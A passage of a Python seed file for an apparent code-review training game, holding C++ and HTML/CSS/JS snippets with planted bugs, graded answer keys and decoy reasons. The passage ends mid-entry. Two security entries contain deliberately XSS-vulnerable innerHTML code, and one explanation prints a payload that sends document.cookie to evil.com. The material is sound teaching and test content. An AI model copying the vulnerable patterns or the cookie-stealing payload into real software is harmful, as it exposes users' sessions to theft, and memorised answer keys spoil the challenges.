"""
Seed content for Code Review challenges (see models.CodeReviewChallenge,
routers/code_review.py): a longer snippet (~20-30 lines), each seeded with
1-3 real bugs or code smells pulled from well-known categories (off-by-one,
dangling references, XSS, race conditions, etc). Objectively graded: the
user clicks the line(s) they think are buggy, then matches each flagged
line to a reason from an answer bank (the real reasons for every issue in
the snippet, padded with plausible decoys) - see routers/code_review.py for
the grading logic.

Snippets are authored with inline `marker` tokens (e.g. "\u2021bug1\u2021") on the
line each issue lives on, rather than hand-counted line numbers - _build()
below locates each marker, records its 1-indexed line number, and strips the
marker out of the snippet text before it's ever seeded/served. This keeps
authoring safe against off-by-one mistakes when snippets get edited.

Two entries per difficulty tier per track (matches this track's weekday
cadence - see config.WEEKDAY_DIFFICULTY); expand over time the same way the
other content banks have.
"""
import re


def _build(snippet: str, issues: list[dict], distractor_reasons: list[str]) -> dict:
    """issues: [{"marker": "...", "reason": "...", "explanation": "..."}, ...]
    Returns {"snippet": <marker-free>, "issues": [{"line", "reason", "explanation"}, ...],
    "distractor_reasons": [...]}."""
    lines = snippet.split("\n")
    built_issues = []
    for spec in issues:
        marker = spec["marker"]
        for i, line in enumerate(lines):
            if marker in line:
                built_issues.append({"line": i + 1, "reason": spec["reason"], "explanation": spec["explanation"]})
                lines[i] = re.sub(r"\s*" + re.escape(marker), "", line)
                break
        else:
            raise ValueError(f"marker {marker!r} not found in snippet")
    return {
        "snippet": "\n".join(lines),
        "issues": built_issues,
        "distractor_reasons": distractor_reasons,
    }


def _entry(difficulty: str, topic: str, title: str, snippet: str, issues: list[dict], distractor_reasons: list[str]) -> dict:
    return {
        "difficulty": difficulty,
        "topic": topic,
        "title": title,
        **_build(snippet, issues, distractor_reasons),
    }


CODE_REVIEW_CHALLENGES = {
    "cpp_core": [
        _entry(
            "easy", "Loops & Bounds", "Sum an Array",
            "#include <vector>\n"
            "#include <string>\n"
            "\n"
            "// Computes the average of a batch of order totals for the\n"
            "// daily summary report.\n"
            "double average(const std::vector<double>& values) {\n"
            "    double sum = 0;\n"
            "    for (int i = 0; i <= values.size(); i++) {  \xe2\x80\xa1bug1\xe2\x80\xa1\n"
            "        sum += values[i];\n"
            "    }\n"
            "    return sum / values.size();\n"
            "}\n"
            "\n"
            "int main() {\n"
            "    std::vector<double> orderTotals = {19.99, 42.50, 7.25, 100.00};\n"
            "    double avg = average(orderTotals);\n"
            "    printf(\"Average order total: %.2f\\n\", avg);\n"
            "    return 0;\n"
            "}\n",
            [{
                "marker": "\xe2\x80\xa1bug1\xe2\x80\xa1",
                "reason": "Off-by-one bounds error",
                "explanation": (
                    "`i <= values.size()` runs one iteration too many, so on the last pass `values[i]` reads one "
                    "element past the end of the vector - undefined behavior (`vector::size()` returns a `size_t`, "
                    "so `i` implicitly converts, but the real bug is the `<=`). Should be `i < values.size()`."
                ),
            }],
            ["Unused variable", "Missing const correctness", "Redundant copy instead of reference"],
        ),
        _entry(
            "easy", "Floating Point", "Price Comparison",
            "#include <vector>\n"
            "\n"
            "struct CartItem {\n"
            "    std::string name;\n"
            "    double price;\n"
            "};\n"
            "\n"
            "// Free shipping kicks in once the order crosses $50.\n"
            "bool isFreeShipping(const std::vector<CartItem>& cart) {\n"
            "    double threshold = 50.00;\n"
            "    double total = 0;\n"
            "    for (const auto& item : cart) {\n"
            "        total += item.price;\n"
            "    }\n"
            "    return total == threshold;  \xe2\x80\xa1bug1\xe2\x80\xa1\n"
            "}\n"
            "\n"
            "int main() {\n"
            "    std::vector<CartItem> cart = {{\"Boots\", 19.99}, {\"Socks\", 15.01}, {\"Laces\", 15.00}};\n"
            "    bool free = isFreeShipping(cart);\n"
            "    printf(\"Free shipping: %s\\n\", free ? \"yes\" : \"no\");\n"
            "    return 0;\n"
            "}\n",
            [{
                "marker": "\xe2\x80\xa1bug1\xe2\x80\xa1",
                "reason": "Comparing floats with ==",
                "explanation": (
                    "Comparing floating-point values with `==` - accumulated rounding error means `total` is almost "
                    "never exactly `50.00` even when the math 'should' work out, so this silently returns false when "
                    "it shouldn't. Compare with a small epsilon tolerance, or better, do money math in integer cents."
                ),
            }],
            ["Missing include guard", "Magic number should be a named constant", "Unnecessary heap allocation"],
        ),
        _entry(
            "medium", "Lifetimes", "Dangling Reference",
            "#include <string>\n"
            "\n"
            "// Used by the log formatter to grab a quick label for the\n"
            "// first word of a request line.\n"
            "const std::string& firstWord(const std::string& sentence) {\n"
            "    std::string word = sentence.substr(0, sentence.find(' '));  \xe2\x80\xa1bug1\xe2\x80\xa1\n"
            "    return word;\n"
            "}\n"
            "\n"
            "void logRequestLine(const std::string& line) {\n"
            "    const std::string& tag = firstWord(line);\n"
            "    printf(\"[%s] %s\\n\", tag.c_str(), line.c_str());\n"
            "}\n"
            "\n"
            "int main() {\n"
            "    logRequestLine(\"GET /api/orders HTTP/1.1\");\n"
            "    logRequestLine(\"POST /api/checkout HTTP/1.1\");\n"
            "    return 0;\n"
            "}\n",
            [{
                "marker": "\xe2\x80\xa1bug1\xe2\x80\xa1",
                "reason": "Dangling reference to a local",
                "explanation": (
                    "`firstWord` returns a reference to `word`, a local variable destroyed the moment the function "
                    "returns - the caller ends up with a dangling reference to freed memory, undefined behavior on "
                    "first use. Either return `std::string` by value (RVO/move makes this cheap) or take an output "
                    "parameter - never return a reference to a local."
                ),
            }],
            ["Unused variable", "Inconsistent naming convention", "Missing const correctness"],
        ),
        _entry(
            "medium", "RAII", "Leaky Parser",
            "#include <string>\n"
            "\n"
            "struct Request {\n"
            "    explicit Request(const std::string& raw) : raw_(raw) {}\n"
            "    bool isValid() const { return !raw_.empty(); }\n"
            "    std::string raw_;\n"
            "};\n"
            "\n"
            "void logError(const std::string& msg);\n"
            "void process(Request* req);\n"
            "\n"
            "void handleRequest(const std::string& raw) {\n"
            "    Request* req = new Request(raw);\n"
            "    if (!req->isValid()) {\n"
            "        logError(\"bad request\");\n"
            "        return;  \xe2\x80\xa1bug1\xe2\x80\xa1\n"
            "    }\n"
            "    process(req);\n"
            "    delete req;\n"
            "}\n"
            "\n"
            "int main() {\n"
            "    handleRequest(\"\");\n"
            "    handleRequest(\"GET /health\");\n"
            "    return 0;\n"
            "}\n",
            [{
                "marker": "\xe2\x80\xa1bug1\xe2\x80\xa1",
                "reason": "Memory leak on early return",
                "explanation": (
                    "If `isValid()` is false, the function returns without ever calling `delete req` - a leak. It "
                    "also leaks if `process(req)` throws, since `delete req` never runs on that path either. Fix by "
                    "using `std::unique_ptr<Request>` so cleanup happens automatically via RAII on every exit path, "
                    "instead of manual `new`/`delete`."
                ),
            }],
            ["No self-assignment check", "Public data member instead of encapsulated", "Dangling reference to a local"],
        ),
        _entry(
            "hard", "Concurrency", "Shared Counter",
            "#include <thread>\n"
            "#include <vector>\n"
            "\n"
            "// requestCount is read by a background reporter thread and\n"
            "// incremented once per request across a pool of worker threads.\n"
            "int requestCount = 0;\n"
            "\n"
            "void onRequestHandled() {\n"
            "    requestCount++;  \xe2\x80\xa1bug1\xe2\x80\xa1\n"
            "}\n"
            "\n"
            "void worker(int requestsToHandle) {\n"
            "    for (int i = 0; i < requestsToHandle; i++) {\n"
            "        onRequestHandled();\n"
            "    }\n"
            "}\n"
            "\n"
            "int main() {\n"
            "    std::vector<std::thread> pool;\n"
            "    for (int i = 0; i < 8; i++) {\n"
            "        pool.emplace_back(worker, 10000);\n"
            "    }\n"
            "    for (auto& t : pool) t.join();\n"
            "    printf(\"total requests: %d\\n\", requestCount);\n"
            "    return 0;\n"
            "}\n",
            [{
                "marker": "\xe2\x80\xa1bug1\xe2\x80\xa1",
                "reason": "Data race on shared state",
                "explanation": (
                    "`requestCount++` is a read-modify-write that isn't atomic, and 8 worker threads call it "
                    "concurrently with no synchronization - increments can be lost (two threads read the same value "
                    "before either writes back), and it's technically undefined behavior in C++ (unsynchronized "
                    "concurrent access to a non-atomic variable with at least one write). Fix with `std::atomic<int>` "
                    "or a mutex guarding the increment."
                ),
            }],
            ["Uninitialized variable used", "Unused variable", "Iterator invalidated after erase"],
        ),
        _entry(
            "hard", "Iterators", "Remove Expired Entries",
            "#include <vector>\n"
            "\n"
            "struct Session {\n"
            "    bool isExpired() const;\n"
            "    std::string id;\n"
            "};\n"
            "\n"
            "// Runs on a timer every minute to sweep out expired sessions.\n"
            "void removeExpired(std::vector<Session>& sessions) {\n"
            "    for (auto it = sessions.begin(); it != sessions.end(); ++it) {\n"
            "        if (it->isExpired()) {\n"
            "            sessions.erase(it);  \xe2\x80\xa1bug1\xe2\x80\xa1\n"
            "        }\n"
            "    }\n"
            "}\n"
            "\n"
            "int main() {\n"
            "    std::vector<Session> sessions = {\n"
            "        {\"s1\"}, {\"s2\"}, {\"s3\"}, {\"s4\"},\n"
            "    };\n"
            "    removeExpired(sessions);\n"
            "    printf(\"sessions remaining: %zu\\n\", sessions.size());\n"
            "    return 0;\n"
            "}\n",
            [{
                "marker": "\xe2\x80\xa1bug1\xe2\x80\xa1",
                "reason": "Iterator invalidated after erase",
                "explanation": (
                    "`vector::erase(it)` invalidates `it` and every iterator after it, but the loop's `++it` then "
                    "advances the now-dangling iterator anyway - undefined behavior (and if it happens to 'work', it "
                    "silently skips the element right after every erased one). `erase` returns the next valid "
                    "iterator - assign it back (`it = sessions.erase(it);`) and only `++it` in the non-erase branch, "
                    "or use the erase-remove idiom instead."
                ),
            }],
            ["Off-by-one bounds error", "Memory leak on early return", "Missing const correctness"],
        ),
        _entry(
            "expert", "Rule of Three", "Copy Assignment",
            "#include <cstring>\n"
            "\n"
            "class Buffer {\n"
            "public:\n"
            "    Buffer(size_t len) : len_(len), data_(new char[len]) {}\n"
            "    ~Buffer() { delete[] data_; }\n"
            "\n"
            "    Buffer& operator=(const Buffer& other) {\n"
            "        delete[] data_;  \xe2\x80\xa1bug1\xe2\x80\xa1\n"
            "        len_ = other.len_;\n"
            "        data_ = new char[len_];\n"
            "        memcpy(data_, other.data_, len_);\n"
            "        return *this;\n"
            "    }\n"
            "\n"
            "private:\n"
            "    size_t len_;\n"
            "    char* data_;\n"
            "};\n"
            "\n"
            "int main() {\n"
            "    Buffer b(16);\n"
            "    b = b;  // self-assignment\n"
            "    return 0;\n"
            "}\n",
            [{
                "marker": "\xe2\x80\xa1bug1\xe2\x80\xa1",
                "reason": "No self-assignment check",
                "explanation": (
                    "`b = b;` first does `delete[] data_`, freeing the buffer - but `other` *is* `*this`, so "
                    "`other.data_`/`other.len_` are now reading freed memory before the copy even starts, and "
                    "`memcpy` copies garbage into a freshly-allocated buffer. Guard with `if (this == &other) return "
                    "*this;` at the top, or use the copy-and-swap idiom, which sidesteps the problem entirely."
                ),
            }],
            ["Object slicing via pass-by-value", "Data race on shared state", "Integer overflow"],
        ),
        _entry(
            "expert", "Polymorphism", "Process a Shape",
            "#include <iostream>\n"
            "\n"
            "class Shape {\n"
            "public:\n"
            "    virtual double area() const { return 0.0; }\n"
            "    virtual ~Shape() = default;\n"
            "};\n"
            "\n"
            "class Circle : public Shape {\n"
            "public:\n"
            "    explicit Circle(double r) : r_(r) {}\n"
            "    double area() const override { return 3.14159 * r_ * r_; }\n"
            "private:\n"
            "    double r_;\n"
            "};\n"
            "\n"
            "void logArea(Shape shape) {  \xe2\x80\xa1bug1\xe2\x80\xa1\n"
            "    std::cout << \"area: \" << shape.area() << \"\\n\";\n"
            "}\n"
            "\n"
            "int main() {\n"
            "    Circle c(5.0);\n"
            "    logArea(c);\n"
            "    return 0;\n"
            "}\n",
            [{
                "marker": "\xe2\x80\xa1bug1\xe2\x80\xa1",
                "reason": "Object slicing via pass-by-value",
                "explanation": (
                    "`logArea` takes `Shape` by value, so passing a `Circle` copies only the `Shape` base-class "
                    "portion into a new, plain `Shape` object - `shape.area()` calls `Shape::area()`, not the "
                    "overridden `Circle::area()`, even though `area()` is virtual. Polymorphism through a by-value "
                    "parameter never works; take `const Shape&` (or a pointer) instead so the virtual call dispatches "
                    "correctly."
                ),
            }],
            ["No self-assignment check", "Missing const correctness", "Unused variable"],
        ),
        _entry(
            "easy", "Uninitialized State", "Retry Budget",
            "#include <cstdio>\n"
            "\n"
            "// Attempts to reconnect to the order queue, giving up after a\n"
            "// few tries.\n"
            "bool connectWithRetry(int maxAttempts) {\n"
            "    bool connected;  \xe2\x80\xa1bug1\xe2\x80\xa1\n"
            "    int attempt = 0;\n"
            "    while (!connected && attempt < maxAttempts) {\n"
            "        connected = (attempt % 3 == 0);  // stand-in for a real connect() call\n"
            "        attempt++;\n"
            "    }\n"
            "    return connected;\n"
            "}\n"
            "\n"
            "int main() {\n"
            "    printf(\"connected: %s\\n\", connectWithRetry(5) ? \"yes\" : \"no\");\n"
            "    return 0;\n"
            "}\n",
            [{
                "marker": "\xe2\x80\xa1bug1\xe2\x80\xa1",
                "reason": "Uninitialized variable used",
                "explanation": (
                    "`bool connected;` has no initializer, so its value is indeterminate before the loop's first "
                    "`!connected` check reads it - technically undefined behavior, and in practice the loop's first "
                    "iteration decision depends on garbage stack memory instead of a known starting state. Initialize "
                    "it explicitly: `bool connected = false;`."
                ),
            }],
            ["Off-by-one bounds error", "Data race on shared state", "Missing const correctness"],
        ),
        _entry(
            "easy", "Const Correctness", "Order Total",
            "#include <vector>\n"
            "\n"
            "struct LineItem {\n"
            "    double price;\n"
            "    int quantity;\n"
            "};\n"
            "\n"
            "// Called on every render of the cart summary, so it runs often.\n"
            "double orderTotal(std::vector<LineItem> items) {  \xe2\x80\xa1bug1\xe2\x80\xa1\n"
            "    double total = 0;\n"
            "    for (const auto& item : items) {\n"
            "        total += item.price * item.quantity;\n"
            "    }\n"
            "    return total;\n"
            "}\n"
            "\n"
            "int main() {\n"
            "    std::vector<LineItem> cart = {{9.99, 2}, {24.50, 1}};\n"
            "    printf(\"total: %.2f\\n\", orderTotal(cart));\n"
            "    return 0;\n"
            "}\n",
            [{
                "marker": "\xe2\x80\xa1bug1\xe2\x80\xa1",
                "reason": "Redundant copy instead of reference",
                "explanation": (
                    "`items` is taken by value, so every call deep-copies the entire vector of LineItems just to read "
                    "from it - wasted allocation and copying on a function that's read-only and 'runs often' per the "
                    "comment. Take `const std::vector<LineItem>&` instead: no copy, and `const` documents that the "
                    "function doesn't modify the cart."
                ),
            }],
            ["Uninitialized variable used", "Dangling reference to a local", "Integer overflow"],
        ),
        _entry(
            "medium", "Smart Pointers", "Manual Cleanup",
            "#include <memory>\n"
            "\n"
            "struct Connection {\n"
            "    void close();\n"
            "};\n"
            "\n"
            "void releaseEarly(std::unique_ptr<Connection>& conn, bool forceClose) {\n"
            "    if (forceClose) {\n"
            "        conn->close();\n"
            "        delete conn.get();  \xe2\x80\xa1bug1\xe2\x80\xa1\n"
            "    }\n"
            "}\n"
            "\n"
            "int main() {\n"
            "    auto conn = std::make_unique<Connection>();\n"
            "    releaseEarly(conn, true);\n"
            "    return 0;\n"
            "}\n",
            [{
                "marker": "\xe2\x80\xa1bug1\xe2\x80\xa1",
                "reason": "Manual delete of a unique_ptr-owned resource",
                "explanation": (
                    "`conn` is a `std::unique_ptr` - it already owns the Connection and will `delete` it "
                    "automatically when it goes out of scope. Calling `delete conn.get()` manually frees the same "
                    "object a second time when `conn`'s own destructor later runs (double free, undefined behavior). "
                    "If early release is genuinely needed, call `conn.reset()`, which safely deletes and nulls the "
                    "pointer in one step - never mix manual `delete` with a smart pointer that already owns the object."
                ),
            }],
            ["No self-assignment check", "Off-by-one bounds error", "Iterator invalidated after erase"],
        ),
        _entry(
            "medium", "STL Algorithms", "Sort by Priority",
            "#include <algorithm>\n"
            "#include <vector>\n"
            "\n"
            "struct Ticket {\n"
            "    int priority;\n"
            "};\n"
            "\n"
            "void sortByPriority(std::vector<Ticket>& tickets) {\n"
            "    std::sort(tickets.begin(), tickets.end(), [](const Ticket& a, const Ticket& b) {\n"
            "        return a.priority <= b.priority;  \xe2\x80\xa1bug1\xe2\x80\xa1\n"
            "    });\n"
            "}\n"
            "\n"
            "int main() {\n"
            "    std::vector<Ticket> tickets = {{3}, {1}, {2}, {1}};\n"
            "    sortByPriority(tickets);\n"
            "    printf(\"lowest priority: %d\\n\", tickets.front().priority);\n"
            "    return 0;\n"
            "}\n",
            [{
                "marker": "\xe2\x80\xa1bug1\xe2\x80\xa1",
                "reason": "Invalid comparator (not strict weak ordering)",
                "explanation": (
                    "`std::sort`'s comparator must implement strict-weak-ordering: it needs `comp(a, b)` to be false "
                    "whenever `a` and `b` are equivalent, but `<=` returns true for equal elements. This violates the "
                    "contract `std::sort` relies on internally and is undefined behavior - real implementations can "
                    "crash, infinite-loop, or produce a corrupted (not fully sorted) result, especially with elements "
                    "that compare equal. Use `<`, not `<=`."
                ),
            }],
            ["Off-by-one bounds error", "Unused variable", "Data race on shared state"],
        ),
        _entry(
            "hard", "Move Semantics", "Forward the Payload",
            "#include <string>\n"
            "#include <utility>\n"
            "\n"
            "struct Message {\n"
            "    std::string payload;\n"
            "};\n"
            "\n"
            "void enqueue(Message msg);\n"
            "\n"
            "void sendTwice(Message msg) {\n"
            "    enqueue(std::move(msg));\n"
            "    printf(\"echo: %s\\n\", msg.payload.c_str());  \xe2\x80\xa1bug1\xe2\x80\xa1\n"
            "}\n"
            "\n"
            "int main() {\n"
            "    sendTwice(Message{\"hello\"});\n"
            "    return 0;\n"
            "}\n",
            [{
                "marker": "\xe2\x80\xa1bug1\xe2\x80\xa1",
                "reason": "Use-after-move",
                "explanation": (
                    "`std::move(msg)` casts `msg` to an rvalue so `enqueue` can steal its resources - after that "
                    "call, `msg` is left in a valid-but-unspecified state (for std::string, likely empty, but that's "
                    "not guaranteed by the standard for user types). Reading `msg.payload` afterward for a real value "
                    "is a bug even though it won't crash: the object was explicitly signaled as 'about to be "
                    "discarded', so its post-move contents shouldn't be relied on for anything but reassignment or "
                    "destruction."
                ),
            }],
            ["Object slicing via pass-by-value", "Missing const correctness", "Integer overflow"],
        ),
        _entry(
            "hard", "Exception Safety", "Batch Loader",
            "#include <vector>\n"
            "\n"
            "struct Record { int id; };\n"
            "Record* parseRecord(const std::string& line);  // throws std::runtime_error on bad input\n"
            "\n"
            "std::vector<Record*> loadBatch(const std::vector<std::string>& lines) {\n"
            "    std::vector<Record*> records;\n"
            "    for (const auto& line : lines) {\n"
            "        Record* r = new Record(*parseRecord(line));  \xe2\x80\xa1bug1\xe2\x80\xa1\n"
            "        records.push_back(r);\n"
            "    }\n"
            "    return records;\n"
            "}\n"
            "\n"
            "int main() {\n"
            "    loadBatch({\"id=1\", \"corrupt\", \"id=3\"});\n"
            "    return 0;\n"
            "}\n",
            [{
                "marker": "\xe2\x80\xa1bug1\xe2\x80\xa1",
                "reason": "Resource leak on exception",
                "explanation": (
                    "If `parseRecord` throws partway through the loop (on the \"corrupt\" line), every `Record*` "
                    "already `new`'d and pushed into `records` on earlier iterations is leaked - the exception "
                    "unwinds past `records.push_back` calls and the local `records` vector's destruction only frees "
                    "the vector's own storage, not the raw pointers it holds. Store `std::unique_ptr<Record>` (or "
                    "avoid heap allocation entirely and store `Record` by value) so cleanup happens automatically "
                    "during unwinding regardless of where an exception is thrown."
                ),
            }],
            ["No self-assignment check", "Public data member instead of encapsulated", "Invalid comparator (not strict weak ordering)"],
        ),
        _entry(
            "expert", "Concurrency", "Transfer Between Accounts",
            "#include <mutex>\n"
            "\n"
            "struct Account {\n"
            "    std::mutex m;\n"
            "    double balance;\n"
            "};\n"
            "\n"
            "void transfer(Account& from, Account& to, double amount) {\n"
            "    std::lock_guard<std::mutex> lockFrom(from.m);  \xe2\x80\xa1bug1\xe2\x80\xa1\n"
            "    std::lock_guard<std::mutex> lockTo(to.m);\n"
            "    from.balance -= amount;\n"
            "    to.balance += amount;\n"
            "}\n"
            "\n"
            "int main() {\n"
            "    Account a{{}, 100.0}, b{{}, 50.0};\n"
            "    transfer(a, b, 25.0);\n"
            "    transfer(b, a, 10.0);\n"
            "    return 0;\n"
            "}\n",
            [{
                "marker": "\xe2\x80\xa1bug1\xe2\x80\xa1",
                "reason": "Lock ordering deadlock",
                "explanation": (
                    "`transfer` always locks `from` then `to`, in whatever order the caller passes them. If thread 1 "
                    "calls `transfer(a, b, ...)` (locks a, then wants b) at the same moment thread 2 calls "
                    "`transfer(b, a, ...)` (locks b, then wants a), each thread holds the lock the other is waiting "
                    "for - permanent deadlock. Fix by always acquiring locks in a consistent global order regardless "
                    "of call-site argument order (e.g. compare account addresses/ids and lock the lower one first), "
                    "or use `std::lock`/`std::scoped_lock` with both mutexes at once, which handles ordering safely "
                    "for you."
                ),
            }],
            ["Data race on shared state", "Use-after-move", "Manual delete of a unique_ptr-owned resource"],
        ),
    ],
    "html_css": [
        _entry(
            "easy", "Accessibility", "Product Image",
            "<article class=\"product-card\">\n"
            "  <a href=\"/products/hiking-boots\">\n"
            "    <img src=\"/img/hiking-boots.jpg\">  \xe2\x80\xa1bug1\xe2\x80\xa1\n"
            "  </a>\n"
            "  <h3>Trailblazer Hiking Boots</h3>\n"
            "  <p class=\"price\">$89.99</p>\n"
            "  <ul class=\"badges\">\n"
            "    <li>Free returns</li>\n"
            "    <li>In stock</li>\n"
            "  </ul>\n"
            "  <button type=\"button\" class=\"add-to-cart\">Add to cart</button>\n"
            "</article>\n",
            [{
                "marker": "\xe2\x80\xa1bug1\xe2\x80\xa1",
                "reason": "Missing alt text",
                "explanation": (
                    "Missing `alt` text on an informative image - screen readers announce it as just 'image' (or "
                    "the raw filename in some browsers), giving a blind user no idea what's being sold. Add a "
                    "descriptive `alt=\"Trailblazer Hiking Boots\"`; only purely decorative images should get "
                    "`alt=\"\"`."
                ),
            }],
            ["z-index without positioning", "Non-semantic div used for interactive control", "Overuse of !important"],
        ),
        _entry(
            "easy", "Semantic HTML", "Clickable Card",
            "<section class=\"catalog\">\n"
            "  <h2>Featured</h2>\n"
            "  <div class=\"card\" onclick=\"openProduct(42)\">  \xe2\x80\xa1bug1\xe2\x80\xa1\n"
            "    <img src=\"/img/hiking-boots.jpg\" alt=\"Trailblazer Hiking Boots\">\n"
            "    <h3>Trailblazer Hiking Boots</h3>\n"
            "    <p>View details</p>\n"
            "  </div>\n"
            "  <div class=\"card\" onclick=\"openProduct(43)\">\n"
            "    <img src=\"/img/trail-socks.jpg\" alt=\"Trail Socks\">\n"
            "    <h3>Trail Socks</h3>\n"
            "    <p>View details</p>\n"
            "  </div>\n"
            "</section>\n",
            [{
                "marker": "\xe2\x80\xa1bug1\xe2\x80\xa1",
                "reason": "Non-semantic div used for interactive control",
                "explanation": (
                    "A `<div onclick>` isn't keyboard-focusable or announced as interactive by screen readers - a "
                    "keyboard-only or screen-reader user has no way to activate it. Use a real `<button>` (or an "
                    "`<a>` if it's real navigation), which gets focus, Enter/Space activation, and correct semantics "
                    "for free."
                ),
            }],
            ["Missing alt text", "Missing form label association", "Color contrast too low for accessibility"],
        ),
        _entry(
            "medium", "Positioning", "Dropdown Menu",
            ".nav {\n"
            "  display: flex;\n"
            "  align-items: center;\n"
            "  gap: 16px;\n"
            "}\n"
            "\n"
            ".dropdown {\n"
            "  position: relative;\n"
            "}\n"
            "\n"
            ".dropdown-menu {\n"
            "  z-index: 999;  \xe2\x80\xa1bug1\xe2\x80\xa1\n"
            "  top: 100%;\n"
            "  left: 0;\n"
            "  min-width: 180px;\n"
            "  background: white;\n"
            "  box-shadow: 0 2px 8px rgba(0,0,0,0.2);\n"
            "}\n"
            "\n"
            ".dropdown-menu.open {\n"
            "  display: block;\n"
            "}\n",
            [{
                "marker": "\xe2\x80\xa1bug1\xe2\x80\xa1",
                "reason": "z-index without positioning",
                "explanation": (
                    "`z-index` only has an effect on a positioned element (`position` set to anything other than the "
                    "default `static`) - without a `position` declaration on `.dropdown-menu` itself, this `z-index: "
                    "999` does nothing, and the dropdown can still render behind other content. Add `position: "
                    "absolute` alongside it."
                ),
            }],
            ["Missing alt text", "XSS via unescaped innerHTML", "Unscoped global CSS selector"],
        ),
        _entry(
            "medium", "Specificity", "Theming Override",
            ":root {\n"
            "  --brand-blue: #2b6cff;\n"
            "}\n"
            "\n"
            ".btn {\n"
            "  padding: 10px 18px;\n"
            "  border-radius: 6px;\n"
            "}\n"
            "\n"
            ".btn-primary {\n"
            "  background: var(--brand-blue);\n"
            "}\n"
            "\n"
            "#header .btn-primary {\n"
            "  background: var(--brand-blue) !important;  \xe2\x80\xa1bug1\xe2\x80\xa1\n"
            "}\n"
            "\n"
            ".btn-primary:hover {\n"
            "  filter: brightness(1.1);\n"
            "}\n",
            [{
                "marker": "\xe2\x80\xa1bug1\xe2\x80\xa1",
                "reason": "Overuse of !important",
                "explanation": (
                    "Reaching for `!important` to beat an ID selector's specificity is a smell, not a fix - it wins "
                    "this battle but makes every future override of `#header .btn-primary` need `!important` too, "
                    "escalating indefinitely. Fix the actual cause (an ID selector styling a reusable component) "
                    "rather than papering over it."
                ),
            }],
            ["Missing viewport meta tag", "Layout thrashing from forced reflow", "z-index without positioning"],
        ),
        _entry(
            "hard", "Security", "Comment Renderer",
            "function fetchComments(postId) {\n"
            "  return fetch(`/api/posts/${postId}/comments`).then(r => r.json());\n"
            "}\n"
            "\n"
            "function renderComment(comment) {\n"
            "  const el = document.getElementById('comments');\n"
            "  el.innerHTML += `<div class=\"comment\">${comment.author}: ${comment.text}</div>`;  \xe2\x80\xa1bug1\xe2\x80\xa1\n"
            "}\n"
            "\n"
            "async function loadComments(postId) {\n"
            "  const comments = await fetchComments(postId);\n"
            "  document.getElementById('comments').innerHTML = '';\n"
            "  comments.forEach(renderComment);\n"
            "}\n"
            "\n"
            "document.addEventListener('DOMContentLoaded', () => {\n"
            "  loadComments(window.CURRENT_POST_ID);\n"
            "});\n",
            [{
                "marker": "\xe2\x80\xa1bug1\xe2\x80\xa1",
                "reason": "XSS via unescaped innerHTML",
                "explanation": (
                    "Stored/reflected XSS: `comment.text` (and `.author`) come from user input and get concatenated "
                    "straight into `innerHTML` with no escaping - a comment containing `<img src=x "
                    "onerror=\"steal()\">` executes arbitrary JS for every viewer. Use `textContent`/`createElement` "
                    "for user-supplied text, or run it through a proper HTML-escaping function before interpolating."
                ),
            }],
            ["z-index without positioning", "Unscoped global CSS selector", "Missing form label association"],
        ),
        _entry(
            "hard", "Responsive Design", "Sidebar Layout",
            ".page {\n"
            "  display: flex;\n"
            "  min-height: 100vh;\n"
            "}\n"
            "\n"
            ".sidebar {\n"
            "  width: 320px;  \xe2\x80\xa1bug1\xe2\x80\xa1\n"
            "  flex-shrink: 0;\n"
            "  background: #1a1a2e;\n"
            "}\n"
            "\n"
            ".content {\n"
            "  width: 900px;\n"
            "  padding: 24px;\n"
            "}\n"
            "\n"
            ".content h1 {\n"
            "  font-size: 1.8rem;\n"
            "  margin-bottom: 12px;\n"
            "}\n",
            [{
                "marker": "\xe2\x80\xa1bug1\xe2\x80\xa1",
                "reason": "Fixed pixel widths break responsiveness",
                "explanation": (
                    "Fixed pixel widths on both flex children add up to 1220px regardless of viewport size - on any "
                    "screen narrower than that (most phones), the layout overflows and forces horizontal scrolling "
                    "instead of reflowing. Give `.content` `flex: 1` (or a `max-width` + `min-width: 0`) so it "
                    "shrinks with the viewport instead of a hardcoded width."
                ),
            }],
            ["Missing alt text", "Overuse of !important", "Color contrast too low for accessibility"],
        ),
        _entry(
            "expert", "Media Queries", "Mobile-First Breakpoints",
            ".nav {\n"
            "  display: flex;\n"
            "  flex-direction: column;\n"
            "}\n"
            "\n"
            "@media (min-width: 1024px) {\n"
            "  .nav { display: none; }\n"
            "}\n"
            "\n"
            "@media (min-width: 640px) {  \xe2\x80\xa1bug1\xe2\x80\xa1\n"
            "  .nav { display: flex; flex-direction: row; }\n"
            "}\n"
            "\n"
            ".nav-toggle {\n"
            "  display: block;\n"
            "}\n"
            "\n"
            "@media (min-width: 640px) {\n"
            "  .nav-toggle { display: none; }\n"
            "}\n",
            [{
                "marker": "\xe2\x80\xa1bug1\xe2\x80\xa1",
                "reason": "Media query source-order bug",
                "explanation": (
                    "Source-order bug: both rules have equal specificity, so on any viewport >=1024px CSS's cascade "
                    "applies the *later* rule (`min-width: 640px`, which also matches) last, silently un-hiding the "
                    "nav the first rule just hid. Mobile-first breakpoints need to be written in ascending order "
                    "(smallest `min-width` first) so each wider rule correctly overrides the narrower one before it."
                ),
            }],
            ["Fixed pixel widths break responsiveness", "Missing viewport meta tag", "Unscoped global CSS selector"],
        ),
        _entry(
            "expert", "Security", "Search Results Template",
            "function escapeHtml(str) {\n"
            "  const div = document.createElement('div');\n"
            "  div.textContent = str;\n"
            "  return div.innerHTML;\n"
            "}\n"
            "\n"
            "function showResults(query, results) {\n"
            "  document.getElementById('heading').innerHTML = `Results for \"${query}\"`;  \xe2\x80\xa1bug1\xe2\x80\xa1\n"
            "  const list = document.getElementById('results-list');\n"
            "  list.innerHTML = '';\n"
            "  results.forEach(r => {\n"
            "    list.innerHTML += `<li>${r.title}</li>`;  \xe2\x80\xa1bug2\xe2\x80\xa1\n"
            "  });\n"
            "}\n"
            "\n"
            "document.getElementById('search-form').addEventListener('submit', (e) => {\n"
            "  e.preventDefault();\n"
            "  const query = document.getElementById('search-input').value;\n"
            "  runSearch(query).then(results => showResults(query, results));\n"
            "});\n",
            [
                {
                    "marker": "\xe2\x80\xa1bug1\xe2\x80\xa1",
                    "reason": "XSS via unescaped innerHTML",
                    "explanation": (
                        "The search `query` comes straight from user input (the search box/URL) and is interpolated "
                        "into `innerHTML` unescaped - a query like `<img src=x onerror=\"fetch('//evil.com?c='+"
                        "document.cookie)\">` runs in every visitor's session. `escapeHtml` is defined right above "
                        "but never used here."
                    ),
                },
                {
                    "marker": "\xe2\x80\xa1bug2\xe2\x80\xa1",
                    "reason": "XSS via unescaped innerHTML",
                    "explanation": (
                        "Each result's `title` (user-generated content, e.g. a product listing name) gets the same "
